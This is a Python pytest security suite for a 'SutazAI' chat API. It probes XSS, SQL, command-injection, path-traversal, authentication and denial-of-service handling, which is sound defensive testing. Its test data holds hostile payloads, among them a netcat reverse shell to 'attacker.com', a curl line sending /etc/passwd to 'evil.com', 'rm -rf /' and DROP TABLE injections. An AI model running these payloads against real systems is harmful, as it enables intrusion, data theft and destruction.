#!/usr/bin/env python3
"""
Comprehensive Security Tests for SutazAI System
Validates security requirements per Rules 1-19
"""

import pytest
import asyncio
import httpx
import json
import base64
import hashlib
import secrets
import time
import jwt
from typing import Dict, Any, List
from datetime import datetime, timedelta
import os
import sys
import re
from urllib.parse import quote, unquote
import xml.etree.ElementTree as ET

# Test configuration
BASE_URL = os.getenv('TEST_BASE_URL', 'http://localhost:10010')
TEST_TIMEOUT = 30.0


@pytest.mark.security
class TestInputValidation:
    """Test input validation and sanitization"""
    
    @pytest.mark.asyncio
    async def test_xss_protection(self):
        """Test protection against XSS attacks"""
        xss_payloads = [
            '<script>alert("xss")</script>',
            '<img src="x" onerror="alert(1)">',
            'javascript:alert("xss")',
            '<svg onload="alert(1)">',
            '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
            '<iframe src="javascript:alert(1)"></iframe>',
            '<body onload="alert(1)">',
            '<input type="image" src="x" onerror="alert(1)">'  
        ]
        
        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
            for payload in xss_payloads:
                # Test XSS in chat message
                chat_request = {
                    'message': payload,
                    'model': 'tinyllama'
                }
                
                response = await client.post(
                    f"{BASE_URL}/api/v1/chat/",
                    json=chat_request
                )
                
                if response.status_code == 200:
                    response_data = response.json()
                    response_text = str(response_data)
                    
                    # Response should not contain executable script tags
                    assert '<script>' not in response_text.lower()
                    assert 'javascript:' not in response_text.lower()
                    assert 'onerror=' not in response_text.lower()
                    assert 'onload=' not in response_text.lower()
    
    @pytest.mark.asyncio
    async def test_sql_injection_protection(self):
        """Test protection against SQL injection"""
        sql_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "' OR 1=1 --",
            "admin'--",
            "' OR 'a'='a",
            "'; EXEC xp_cmdshell('dir'); --"
        ]
        
        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
            for payload in sql_payloads:
                # Test in chat message (which might query database)
                chat_request = {
                    'message': payload,
                    'model': 'tinyllama'
                }
                
                response = await client.post(
                    f"{BASE_URL}/api/v1/chat/",
                    json=chat_request
                )
                
                # Should handle gracefully, not return database errors
                if response.status_code == 200:
                    response_text = response.text.lower()
                    
                    # Should not contain database error messages
                    assert 'sql' not in response_text
                    assert 'database' not in response_text
                    assert 'table' not in response_text
                    assert 'syntax error' not in response_text
                else:
                    # Should return appropriate error, not 500
                    assert response.status_code in [400, 422]
    
    @pytest.mark.asyncio
    async def test_command_injection_protection(self):
        """Test protection against command injection"""
        command_payloads = [
            '; ls -la',
            '&& cat /etc/passwd',
            '| whoami',
            '; rm -rf /',
            '`cat /etc/passwd`',
            '$(cat /etc/passwd)',
            '; nc -e /bin/sh attacker.com 4444',
            '&& curl http://evil.com/steal?data=$(cat /etc/passwd)'
        ]
        
        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
            for payload in command_payloads:
                chat_request = {
                    'message': f'Process this: {payload}',
                    'model': 'tinyllama'
                }
                
                response = await client.post(
                    f"{BASE_URL}/api/v1/chat/",
                    json=chat_request
                )
                
                if response.status_code == 200:
                    response_text = response.text.lower()
                    
                    # Should not contain system file contents or command outputs
                    assert 'root:x:0:0:root' not in response_text  # /etc/passwd content
                    assert 'bin/bash' not in response_text
                    assert 'total ' not in response_text  # ls output
    
    @pytest.mark.asyncio
    async def test_path_traversal_protection(self):
        """Test protection against path traversal attacks"""
        path_payloads = [
            '../../../etc/passwd',
            '..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam',
            '....//....//....//etc//passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..%252f..%252f..%252fetc%252fpasswd',
            '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd'
        ]
        
        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
            for payload in path_payloads:
                # Test as parameter
                response = await client.get(f"{BASE_URL}/api/v1/files/{quote(payload)}")
                
                # Should not allow access to system files
                if response.status_code != 404:
                    assert response.status_code in [400, 403, 422]
                    
                    if response.status_code == 200:
                        content = response.text.lower()
                        assert 'root:x:0:0' not in content  # /etc/passwd
    
    @pytest.mark.asyncio
    async def test_large_input_handling(self):
        """Test handling of excessively large inputs"""
        # Test with very large message
        large_message = 'A' * 100000  # 100KB
        
        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
            chat_request = {
                'message': large_message,
                'model': 'tinyllama'
            }
            
            response = await client.post(
                f"{BASE_URL}/api/v1/chat/",
                json=chat_request
            )
            
            # Should handle gracefully (accept, reject, or timeout)
            assert response.status_code in [200, 413, 422, 400]
            
            # If accepted, should not crash or return huge response
            if response.status_code == 200:
                assert len(response.text) < 1000000  # Response should be reasonable size
    
    @pytest.mark.asyncio
    async def test_malformed_json_handling(self):
        """Test handling of malformed JSON inputs"""
        malformed_payloads = [
            '{"message": "test", "model":',  # Incomplete JSON
            '{"message": "test", "model": "tinyllama"}extra',  # Extra data
            '{"message": "test", "model": "tinyllama", }',  # Trailing comma
            '{message: "test", model: "tinyllama"}',  # Unquoted keys
            '{"message": "test\\u0000", "model": "tinyllama"}'  # Null byte
        ]
        
        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
            for payload in malformed_payloads:
                response = await client.post(
                    f"{BASE_URL}/api/v1/chat/",
                    content=payload,
                    headers={'Content-Type': 'application/json'}
                )
                
                # Should return proper error, not 500
                assert response.status_code in [400, 422]


@pytest.mark.security
class TestAuthentication:
    """Test authentication mechanisms"""
    
    @pytest.mark.asyncio
    async def test_protected_endpoints_require_auth(self):
        """Test that protected endpoints require authentication"""
        protected_endpoints = [
            '/api/v1/admin/users',
            '/api/v1/admin/config',
            '/api/v1/system/shutdown',
            '/api/v1/admin/logs'
        ]
        
        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
            for endpoint in protected_endpoints:
                response = await client.get(f"{BASE_URL}{endpoint}")
                
                # Should require authentication (401) or not exist (404)
                assert response.status_code in [401, 403, 404]
    
    @pytest.mark.asyncio
    async def test_invalid_token_handling(self):
        """Test handling of invalid JWT tokens"""
        invalid_tokens = [
            'invalid.token.here',
            'Bearer invalid_token',
            'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.invalid.signature',
            '',
            'Bearer ',
            'Basic dGVzdDp0ZXN0'  # Basic auth instead of JWT
        ]
        
        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
            for token in invalid_tokens:
                headers = {'Authorization': token} if token else {}
                
                response = await client.get(
                    f"{BASE_URL}/api/v1/admin/users",
                    headers=headers
                )
                
                # Should reject invalid tokens
                assert response.status_code in [401, 403, 404]
    
    @pytest.mark.asyncio
    async def test_jwt_token_validation(self):
        """Test JWT token structure validation"""
        # Create a JWT with invalid signature
        header = base64.urlsafe_b64encode(json.dumps({
            "alg": "HS256",
            "typ": "JWT"
        }).encode()).decode().rstrip('=')
        
        payload = base64.urlsafe_b64encode(json.dumps({
            "user_id": "test_user",
            "exp": int(time.time()) + 3600
        }).encode()).decode().rstrip('=')
        
        fake_signature = base64.urlsafe_b64encode(b'fake_signature').decode().rstrip('=')
        fake_jwt = f"{header}.{payload}.{fake_signature}"
        
        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
            response = await client.get(
                f"{BASE_URL}/api/v1/admin/users",
                headers={'Authorization': f'Bearer {fake_jwt}'}
            )
            
            # Should reject token with invalid signature
            assert response.status_code in [401, 403, 404]
    
    @pytest.mark.asyncio
    async def test_session_timeout(self):
        """Test session timeout handling"""
        # Create expired JWT
        expired_payload = {
            "user_id": "test_user",
            "exp": int(time.time()) - 3600  # Expired 1 hour ago
        }
        
        # Note: We can't create a valid signature without the secret,
        # but we can test the structure
        try:
            expired_token = jwt.encode(expired_payload, 'fake_secret', algorithm='HS256')
            
            async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
                response = await client.get(
                    f"{BASE_URL}/api/v1/admin/users",
                    headers={'Authorization': f'Bearer {expired_token}'}
                )
                
                # Should reject expired token
                assert response.status_code in [401, 403, 404]
        except ImportError:
            # PyJWT not available, skip this specific test
            pytest.skip("PyJWT not available for token creation")


@pytest.mark.security
class TestAuthorization:
    """Test authorization and access control"""
    
    @pytest.mark.asyncio
    async def test_rbac_enforcement(self):
        """Test role-based access control"""
        # Test different role scenarios (if implemented)
        admin_endpoints = [
            '/api/v1/admin/users',
            '/api/v1/admin/system',
            '/api/v1/admin/config'
        ]
        
        user_endpoints = [
            '/api/v1/user/profile',
            '/api/v1/user/preferences'
        ]
        
        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
            # Test without any authentication
            for endpoint in admin_endpoints + user_endpoints:
                response = await client.get(f"{BASE_URL}{endpoint}")
                assert response.status_code in [401, 403, 404]
    
    @pytest.mark.asyncio
    async def test_privilege_escalation_prevention(self):
        """Test prevention of privilege escalation"""
        escalation_attempts = [
            '/api/v1/admin/../admin/users',
            '/api/v1/user/../../admin/config',
            '/api/v1//admin//users',
            '/api/v1/./admin/./users'
        ]
        
        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
            for endpoint in escalation_attempts:
                response = await client.get(f"{BASE_URL}{endpoint}")
                # Should not allow access to admin endpoints through path manipulation
                assert response.status_code in [400, 401, 403, 404]


@pytest.mark.security
class TestDataSecurity:
    """Test data security and privacy"""
    
    @pytest.mark.asyncio
    async def test_sensitive_data_exposure(self):
        """Test that sensitive data is not exposed in responses"""
        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
            # Test various endpoints for sensitive data leakage
            endpoints = [
                '/health',
                '/metrics',
                '/api/v1/system/info',
                '/api/v1/models/',
            ]
            
            sensitive_patterns = [
                r'password["\s]*[:=]["\s]*\w+',
                r'secret["\s]*[:=]["\s]*\w+',
                r'token["\s]*[:=]["\s]*[\w\-\.]+',
                r'key["\s]*[:=]["\s]*[\w\-\.]+',
                r'api_key["\s]*[:=]["\s]*[\w\-\.]+',
                r'database_url["\s]*[:=]',
                r'redis_url["\s]*[:=]',
                r'postgresql://.*:.*@'
            ]
            
            for endpoint in endpoints:
                response = await client.get(f"{BASE_URL}{endpoint}")
                
                if response.status_code == 200:
                    response_text = response.text.lower()
                    
                    for pattern in sensitive_patterns:
                        matches = re.findall(pattern, response_text, re.IGNORECASE)
                        assert not matches, f"Sensitive data exposed in {endpoint}: {matches}"
    
    @pytest.mark.asyncio
    async def test_information_disclosure(self):
        """Test for information disclosure vulnerabilities"""
        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
            # Test error pages for information disclosure
            response = await client.get(f"{BASE_URL}/nonexistent-endpoint")
            
            if response.status_code == 404:
                error_text = response.text.lower()
                
                # Should not expose internal paths, versions, or stack traces
                assert '/opt/sutazaiapp' not in error_text
                assert 'traceback' not in error_text
                assert 'python' not in error_text or 'version' not in error_text
                assert 'fastapi' not in error_text or 'version' not in error_text
    
    @pytest.mark.asyncio
    async def test_headers_security(self):
        """Test security headers are properly set"""
        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
            response = await client.get(f"{BASE_URL}/health")
            
            headers = response.headers
            
            # Check for important security headers
            # Note: Not all may be implemented yet
            security_headers = {
                'X-Content-Type-Options': 'nosniff',
                'X-Frame-Options': ['DENY', 'SAMEORIGIN'],
                'X-XSS-Protection': '1; mode=block'
            }
            
            for header_name, expected_values in security_headers.items():
                if header_name in headers:
                    header_value = headers[header_name]
                    if isinstance(expected_values, list):
                        assert header_value in expected_values
                    else:
                        assert header_value == expected_values
    
    @pytest.mark.asyncio
    async def test_cors_configuration(self):
        """Test CORS configuration is secure"""
        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
            # Test preflight request
            response = await client.options(
                f"{BASE_URL}/api/v1/chat/",
                headers={
                    'Origin': 'https://evil.com',
                    'Access-Control-Request-Method': 'POST',
                    'Access-Control-Request-Headers': 'Content-Type'
                }
            )
            
            if 'Access-Control-Allow-Origin' in response.headers:
                allowed_origin = response.headers['Access-Control-Allow-Origin']
                
                # Should not allow all origins in production
                assert allowed_origin != '*' or os.getenv('ENVIRONMENT') == 'development'
                
                # Should not allow arbitrary origins
                assert 'evil.com' not in allowed_origin


@pytest.mark.security
class TestNetworkSecurity:
    """Test network-level security"""
    
    @pytest.mark.asyncio
    async def test_http_methods_restriction(self):
        """Test that only allowed HTTP methods are accepted"""
        dangerous_methods = ['TRACE', 'CONNECT', 'PATCH']
        
        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
            for method in dangerous_methods:
                try:
                    response = await client.request(method, f"{BASE_URL}/health")
                    # Should not allow dangerous methods
                    assert response.status_code in [405, 501]
                except Exception:
                    # Method not supported by client - that's also acceptable
                    pass
    
    @pytest.mark.asyncio
    async def test_rate_limiting(self):
        """Test rate limiting protection"""
        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
            # Send many requests quickly
            responses = []
            
            for i in range(100):
                try:
                    response = await client.get(f"{BASE_URL}/health")
                    responses.append(response.status_code)
                except Exception:
                    # Connection might be refused due to rate limiting
                    responses.append(429)
                
                # Small delay to avoid overwhelming the test system
                await asyncio.sleep(0.01)
            
            # Should have some successful responses
            success_count = sum(1 for status in responses if status == 200)
            assert success_count > 0
            
            # Rate limiting might kick in (429), but not required for this test
            # Just ensure system doesn't crash
            crash_indicators = [500, 502, 503]
            crash_count = sum(1 for status in responses if status in crash_indicators)
            assert crash_count < 10  # Less than 10% crashes acceptable
    
    @pytest.mark.asyncio
    async def test_slowloris_protection(self):
        """Test protection against slow HTTP attacks"""
        # This is a simplified test - real slowloris would be more complex
        async with httpx.AsyncClient(timeout=30.0) as client:
            start_time = time.time()
            
            # Send request with very slow data
            try:
                response = await client.post(
                    f"{BASE_URL}/api/v1/chat/",
                    json={'message': 'test', 'model': 'tinyllama'},
                    timeout=30.0
                )
                
                elapsed = time.time() - start_time
                
                # Should respond within reasonable time even with slow client
                assert elapsed < 30.0
                assert response.status_code in [200, 408, 413, 422]
                
            except httpx.TimeoutException:
                # Timeout is acceptable protection
                pass


@pytest.mark.security
class TestCryptography:
    """Test cryptographic implementations"""
    
    def test_password_hashing_security(self):
        """Test password hashing meets security standards"""
        # This would test the actual password hashing implementation
        # For now, we test general principles
        
        test_password = "test_password_123"
        
        # Simulate password hashing (would use actual implementation)
        import hashlib
        salt = secrets.token_hex(32)
        hashed = hashlib.pbkdf2_hmac('sha256', test_password.encode(), salt.encode(), 100000)
        
        # Hash should be different from password
        assert hashed != test_password.encode()
        
        # Hash should be deterministic with same salt
        hashed2 = hashlib.pbkdf2_hmac('sha256', test_password.encode(), salt.encode(), 100000)
        assert hashed == hashed2
        
        # Different passwords should produce different hashes
        different_hash = hashlib.pbkdf2_hmac('sha256', 'different_password'.encode(), salt.encode(), 100000)
        assert hashed != different_hash
    
    def test_random_generation_quality(self):
        """Test quality of random number generation"""
        # Generate multiple random values
        random_values = [secrets.token_hex(32) for _ in range(100)]
        
        # Should all be unique
        assert len(set(random_values)) == 100
        
        # Should have proper length
        assert all(len(val) == 64 for val in random_values)  # 32 bytes = 64 hex chars
        
        # Should contain varied characters
        combined = ''.join(random_values)
        unique_chars = set(combined)
        assert len(unique_chars) >= 10  # Should use most hex digits
    
    def test_secure_token_generation(self):
        """Test secure token generation"""
        # Generate API tokens
        tokens = [secrets.token_urlsafe(32) for _ in range(50)]
        
        # Should all be unique
        assert len(set(tokens)) == 50
        
        # Should be URL-safe
        import string
        allowed_chars = string.ascii_letters + string.digits + '-_'
        for token in tokens:
            assert all(c in allowed_chars for c in token)


@pytest.mark.security
class TestDenialOfService:
    """Test protection against DoS attacks"""
    
    @pytest.mark.asyncio
    async def test_resource_exhaustion_protection(self):
        """Test protection against resource exhaustion"""
        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
            # Test with many concurrent connections
            async def make_request():
                try:
                    response = await client.get(f"{BASE_URL}/health")
                    return response.status_code == 200
                except Exception:
                    return False
            
            # Create 50 concurrent requests
            tasks = [make_request() for _ in range(50)]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Should handle most requests successfully
            success_count = sum(1 for result in results if result is True)
            assert success_count >= 25  # At least 50% success rate
    
    @pytest.mark.asyncio
    async def test_memory_bomb_protection(self):
        """Test protection against memory exhaustion attacks"""
        # Test with large JSON payload
        large_data = {'message': 'A' * 100000, 'model': 'tinyllama'}
        
        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
            response = await client.post(
                f"{BASE_URL}/api/v1/chat/",
                json=large_data
            )
            
            # Should handle large payload gracefully
            assert response.status_code in [200, 413, 422]
            
            # If accepted, response should be reasonable size
            if response.status_code == 200:
                assert len(response.content) < 1000000  # Less than 1MB response
    
    @pytest.mark.asyncio
    async def test_cpu_exhaustion_protection(self):
        """Test protection against CPU exhaustion"""
        # Send complex regex patterns or computationally expensive inputs
        complex_patterns = [
            'a' * 1000 + '(a+)+' + 'b' * 1000,  # Regex DoS pattern
            '((((((((((x))))))))))' * 100,  # Nested patterns
            'x' * 10000,  # Very long string
        ]
        
        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
            for pattern in complex_patterns:
                start_time = time.time()
                
                response = await client.post(
                    f"{BASE_URL}/api/v1/chat/",
                    json={'message': pattern, 'model': 'tinyllama'}
                )
                
                processing_time = time.time() - start_time
                
                # Should not take excessive time to process
                assert processing_time < 30.0  # Maximum 30 seconds
                
                # Should handle gracefully
                assert response.status_code in [200, 400, 422, 413]


if __name__ == '__main__':
    pytest.main([__file__, '-v', '--tb=short'])